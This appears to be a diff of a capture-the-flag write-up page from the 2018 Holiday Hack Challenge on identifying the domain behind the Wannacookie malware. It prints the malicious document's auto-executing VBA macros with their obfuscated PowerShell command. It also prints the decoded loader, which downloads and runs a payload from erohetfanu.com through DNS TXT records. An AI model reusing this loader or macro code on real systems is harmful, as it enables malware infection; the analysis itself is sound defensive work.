@@ -28,7 +28,7 @@
   <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
     <link rel="index" title="Index" href="../genindex.html" />
     <link rel="search" title="Search" href="../search.html" />
-    <link rel="next" title="Question 11" href="question11.html" />
+    <link rel="next" title="Question 11: Stop the Malware" href="question11.html" />
     <link rel="prev" title="Question 9: Catch the Malware" href="question9.html" /> 
 
   
@@ -92,14 +92,14 @@
 <li class="toctree-l1"><a class="reference internal" href="question9.html">Question 9: Catch the Malware</a></li>
 <li class="toctree-l1 current"><a class="current reference internal" href="#">Question 10: Identify the Domain</a><ul>
 <li class="toctree-l2"><a class="reference internal" href="#solution">Solution</a><ul>
-<li class="toctree-l3"><a class="reference internal" href="#environment">Environment</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#step-1-analyse-the-document">Step 1: Analyse the document</a></li>
 </ul>
 </li>
 </ul>
 </li>
-<li class="toctree-l1"><a class="reference internal" href="question11.html">Question 11</a></li>
+<li class="toctree-l1"><a class="reference internal" href="question11.html">Question 11: Stop the Malware</a></li>
 <li class="toctree-l1"><a class="reference internal" href="question12.html">Question 12: Recover Alabaster’s Password</a></li>
-<li class="toctree-l1"><a class="reference internal" href="question13.html">Question 13</a></li>
+<li class="toctree-l1"><a class="reference internal" href="question13.html">Question 13: Santa’s Door</a></li>
 <li class="toctree-l1"><a class="reference internal" href="question14.html">Question 14: Who Is Behind It All?</a></li>
 </ul>
 <p class="caption"><span class="caption-text">Terminals:</span></p>
@@ -190,30 +190,78 @@
 <p>Answer: <em>erohetfanu.com</em></p>
 <div class="section" id="solution">
 <h2>Solution<a class="headerlink" href="#solution" title="Permalink to this headline">¶</a></h2>
-<p>To solve this challenge we decided to analyse the malware and determine where it downloads from.</p>
-<p>TODO: Insert text from Alabaster with the instructions</p>
-<p><a class="reference external" href="https://www.holidayhackchallenge.com/2018/challenges/CHOCOLATE_CHIP_COOKIE_RECIPE.zip">https://www.holidayhackchallenge.com/2018/challenges/CHOCOLATE_CHIP_COOKIE_RECIPE.zip</a></p>
-<div class="section" id="environment">
-<h3>Environment<a class="headerlink" href="#environment" title="Permalink to this headline">¶</a></h3>
+<div class="admonition note">
+<p class="first admonition-title">Note</p>
+<p class="last">The document from Alabaster can be downloaded using: <a class="reference external" href="https://www.holidayhackchallenge.com/2018/challenges/CHOCOLATE_CHIP_COOKIE_RECIPE.zip">https://www.holidayhackchallenge.com/2018/challenges/CHOCOLATE_CHIP_COOKIE_RECIPE.zip</a>
+The password for the archive is <code class="docutils literal notranslate"><span class="pre">elves</span></code></p>
+</div>
+<div class="section" id="step-1-analyse-the-document">
+<h3>Step 1: Analyse the document<a class="headerlink" href="#step-1-analyse-the-document" title="Permalink to this headline">¶</a></h3>
 <p>The environment we used to analyse the document was a virtual machine with the Kali Linux 2018.4 operating system.</p>
 <div class="admonition note">
 <p class="first admonition-title">Note</p>
-<p class="last">Kali Linux 2018.4 had an issue unarchiving the document from the .zip file using the <strong>unzip</strong> application. In turn, the <strong>olevba</strong> application also couldn’t analyse the document while it was still within the zip archive. We solved this issue by extracting the <code class="docutils literal notranslate"><span class="pre">CHOCOLATE_CHIP_COOKIE_RECIPE.docm</span></code> file from the zip archive using the <strong>7z</strong> application.</p>
+<p class="last"><strong>Kali Linux 2018.4</strong> had an issue unarchiving the document from the ZIP file using the <strong>unzip</strong> application. In turn, the <strong>olevba</strong> application also couldn’t analyse the document while it was still within the zip archive. We solved this issue by extracting the <code class="docutils literal notranslate"><span class="pre">CHOCOLATE_CHIP_COOKIE_RECIPE.docm</span></code> file from the zip archive using the <strong>7z</strong> application and analysing the document outside of the archive.</p>
 </div>
-<p>After downloading the zip file we extracted the <code class="docutils literal notranslate"><span class="pre">CHOCOLATE_CHIP_COOKIE_RECIPE.docm</span></code> file.</p>
-<p>We extracted the <code class="docutils literal notranslate"><span class="pre">CHOCOLATE_CHIP_COOKIE_RECIPE.docm</span></code> file from the extracted zip file using 7z.</p>
+<p>We used the following command to analyse the document: <code class="docutils literal notranslate"><span class="pre">olevba</span> <span class="pre">CHOCOLATE_CHIP_COOKIE_RECIPE.docm</span></code>.</p>
 <div class="admonition note">
 <p class="first admonition-title">Note</p>
-<p class="last">We were forced to extract the file because the default unzip program in operating system we were using could not support the encryption method. This is a known issue.</p>
+<p class="last"><strong>olevba</strong> is a python script to parse OLE and OpenXML files such as MS Office documents (e.g. Word, Excel), to detect VBA Macros, extract their source code in clear text, decode malware obfuscation (Hex/Base64/StrReverse/Dridex) and detect security-related patterns such as auto-executable macros, suspicious VBA keywords used by malware, and potential IOCs (IP addresses, URLs, executable filenames, etc).</p>
 </div>
-<div class="admonition tip">
-<p class="first admonition-title">Tip</p>
-<p>We found the following hint from Alabaster Snowball to be useful:</p>
-<p class="last"><strong>wannacookie.min.ps1</strong>? I wonder if there is a non-minified version? If so, it may be easier to read and give us more information and maybe source comments?</p>
+<p>Our output from olevba consisted of the following:</p>
+<div class="highlight-none notranslate"><div class="highlight"><pre><span></span>olevba 0.53.1 - http://decalage.info/python/oletools
+Flags        Filename
+-----------  -----------------------------------------------------------------
+OpX:MASI---- CHOCOLATE_CHIP_COOKIE_RECIPE.docm
+===============================================================================
+FILE: CHOCOLATE_CHIP_COOKIE_RECIPE.docm
+Type: OpenXML
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls
+in file: word/vbaProject.bin - OLE stream: u&#39;VBA/ThisDocument&#39;
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO Module1.bas
+in file: word/vbaProject.bin - OLE stream: u&#39;VBA/Module1&#39;
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+Private Sub Document_Open()
+Dim cmd As String
+<span class="hll">cmd = &quot;powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C &quot;&quot;sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(&#39;lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG&#39;),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()&quot;&quot; &quot;
+</span>Shell cmd
+End Sub
+
+-------------------------------------------------------------------------------
+VBA MACRO NewMacros.bas
+in file: word/vbaProject.bin - OLE stream: u&#39;VBA/NewMacros&#39;
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+Sub AutoOpen()
+Dim cmd As String
+<span class="hll">cmd = &quot;powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C &quot;&quot;sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(&#39;lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG&#39;),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()&quot;&quot; &quot;
+</span>Shell cmd
+End Sub
+
++------------+-----------------+-----------------------------------------+
+| Type       | Keyword         | Description                             |
++------------+-----------------+-----------------------------------------+
+| AutoExec   | AutoOpen        | Runs when the Word document is opened   |
+| AutoExec   | Document_Open   | Runs when the Word or Publisher         |
+|            |                 | document is opened                      |
+| Suspicious | Shell           | May run an executable file or a system  |
+|            |                 | command                                 |
+| Suspicious | powershell      | May run PowerShell commands             |
+| Suspicious | ExecutionPolicy | May run PowerShell commands             |
+| Suspicious | New-Object      | May create an OLE object using          |
+|            |                 | PowerShell                              |
+| IOC        | powershell.exe  | Executable file name                    |
++------------+-----------------+-----------------------------------------+
+</pre></div>
 </div>
-<p>To utilise this hint we started with the following wannacookie loader code.</p>
-<p>TODO: How did we obtain this code?</p>
-<div class="highlight-PowerShell notranslate"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+<p>The two emphasised lines in the code block shown above were identical. An examination of this PowerShell code revealed that it decoded (base64) then uncompressed the encoded string to create some new code. This new code was then executed. Our aim was to analyse this new code without executing it. We modified the code returned by olevba so that it stored the decoded/uncompressed string in a file called <code class="docutils literal notranslate"><span class="pre">WannacookieLoader.ps1</span></code> without executing the new code. The code we created to do this is shown below:</p>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="n">-C</span> <span class="s2">&quot;sal a New-Object; (a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(&#39;lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG&#39;),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd() | Out-File E:\Temp\WannacookieLoader.ps1&quot;</span>
+</pre></div>
+</div>
+<p>We ran the above code using Windows PowerShell ISE in a Windows 10 virtual machine. The following code snippet shows the contents of the output (<code class="docutils literal notranslate"><span class="pre">WannacookieLoader.ps1</span></code>) after some modifications for better readability:</p>
+<div class="highlight-powershell notranslate"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
  2
  3
  4
@@ -222,25 +270,40 @@
  7
  8
  9
-10
-11</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="k">function</span> <span class="n">H2A</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span> <span class="p">{</span>
-  <span class="nv">$o</span>
-  <span class="nv">$a</span> <span class="n">-split</span> <span class="s1">&#39;(..)&#39;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span> <span class="nv">$_</span> <span class="p">}</span>  <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span><span class="no">[char]</span><span class="p">(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">toint16</span><span class="p">(</span><span class="nv">$_</span><span class="p">,</span><span class="n">16</span><span class="p">))}</span> <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span><span class="nv">$o</span> <span class="p">=</span> <span class="nv">$o</span> <span class="p">+</span> <span class="nv">$_</span><span class="p">}</span>
-      <span class="k">return</span> <span class="nv">$o</span>
-  <span class="p">}</span>
-<span class="hll">  <span class="nv">$f</span> <span class="p">=</span> <span class="s2">&quot;77616E6E61636F6F6B69652E6D696E2E707331&quot;</span>
-</span>  <span class="nv">$h</span> <span class="p">=</span> <span class="s2">&quot;&quot;</span>
-  <span class="k">foreach</span> <span class="p">(</span><span class="nv">$i</span> <span class="k">in</span> <span class="n">0</span><span class="p">..(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">ToInt32</span><span class="p">((</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$f.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">strings</span><span class="p">,</span> <span class="n">10</span><span class="p">)-</span><span class="n">1</span><span class="p">))</span> <span class="p">{</span>
-      <span class="nv">$h</span> <span class="p">+=</span> <span class="p">(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$i.$f.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">strings</span>
-  <span class="p">}</span>
-  <span class="p">($(</span><span class="n">H2A</span> <span class="nv">$h</span> <span class="p">|</span> <span class="nb">Out-string</span><span class="p">))</span>
+10</pre></div></td><td class="code"><div class="highlight"><pre><span></span> <span class="k">function</span> <span class="n">H2A</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span> <span class="p">{</span>
+   <span class="nv">$o</span><span class="p">;</span> <span class="nv">$a</span> <span class="n">-split</span> <span class="s1">&#39;(..)&#39;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span> <span class="nv">$_</span> <span class="p">}</span>  <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span><span class="no">[char]</span><span class="p">(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">toint16</span><span class="p">(</span><span class="nv">$_</span><span class="p">,</span><span class="n">16</span><span class="p">))}</span> <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span><span class="nv">$o</span> <span class="p">=</span> <span class="nv">$o</span> <span class="p">+</span> <span class="nv">$_</span><span class="p">}</span>
+   <span class="k">return</span> <span class="nv">$o</span>
+ <span class="p">}</span>
+ <span class="nv">$f</span> <span class="p">=</span> <span class="s2">&quot;77616E6E61636F6F6B69652E6D696E2E707331&quot;</span>
+ <span class="nv">$h</span> <span class="p">=</span> <span class="s2">&quot;&quot;</span>
+ <span class="k">foreach</span> <span class="p">(</span><span class="nv">$i</span> <span class="k">in</span> <span class="n">0</span><span class="p">..(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">ToInt32</span><span class="p">((</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$f.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">strings</span><span class="p">,</span> <span class="n">10</span><span class="p">)-</span><span class="n">1</span><span class="p">))</span> <span class="p">{</span>
+   <span class="nv">$h</span> <span class="p">+=</span> <span class="p">(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$i.$f.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">strings</span>
+ <span class="p">}</span>
+ <span class="n">iex</span><span class="p">($(</span><span class="n">H2A</span> <span class="nv">$h</span> <span class="p">|</span> <span class="nb">Out-string</span><span class="p">))</span>
 </pre></div>
 </td></tr></table></div>
-<p>We need to modify line 6 in the above code. We can perform a simple HEX to ASCII conversion to obtain <code class="docutils literal notranslate"><span class="pre">wannacookie.min.ps1</span></code> from <code class="docutils literal notranslate"><span class="pre">77616E6E61636F6F6B69652E6D696E2E707331</span></code>.</p>
-<p>Utilising the hint, we replace <code class="docutils literal notranslate"><span class="pre">wannacookie.min.ps1</span></code> with <code class="docutils literal notranslate"><span class="pre">wannacookie.ps1</span></code>. Line 6 in the above code then becomes:</p>
-<div class="highlight-PowerShell notranslate"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>6</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="hll"><span class="nv">$f</span> <span class="p">=</span> <span class="s2">&quot;77616E6E61636F6F6B69652E707331&quot;</span>
-</span></pre></div>
-</td></tr></table></div>
+<p>We performed a HEX -&gt; ASCII translation on the string in line 5 to create the following table:</p>
+<table border="1" class="docutils">
+<colgroup>
+<col width="24%" />
+<col width="76%" />
+</colgroup>
+<thead valign="bottom">
+<tr class="row-odd"><th class="head">Item</th>
+<th class="head">Value</th>
+</tr>
+</thead>
+<tbody valign="top">
+<tr class="row-even"><td>Decoded text</td>
+<td>wannacookie.min.ps1</td>
+</tr>
+<tr class="row-odd"><td>string</td>
+<td>77616E6E61636F6F6B69652E6D696E2E707331</td>
+</tr>
+</tbody>
+</table>
+<p>Examining <code class="docutils literal notranslate"><span class="pre">WannacookieLoader.ps1</span></code> showed that its purpose was to download the Wannacookie malware (<code class="docutils literal notranslate"><span class="pre">wannacookie.min.ps1</span></code>) via a clever use of DNS TXT records.</p>
+<p>The above script also provided us with the domain name from which the malware was downloaded from: <code class="docutils literal notranslate"><span class="pre">erohetfanu.com</span></code></p>
 </div>
 </div>
 </div>
@@ -253,7 +316,7 @@
   
     <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
       
-        <a href="question11.html" class="btn btn-neutral float-right" title="Question 11" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+        <a href="question11.html" class="btn btn-neutral float-right" title="Question 11: Stop the Malware" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
       
       
         <a href="question9.html" class="btn btn-neutral" title="Question 9: Catch the Malware" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
@@ -268,8 +331,7 @@
         &copy; Copyright 2019, Antonios and Peter Lapornik
 
     </p>
-  </div>
-  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/rtfd/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+  </div> 
 
 </footer>
 
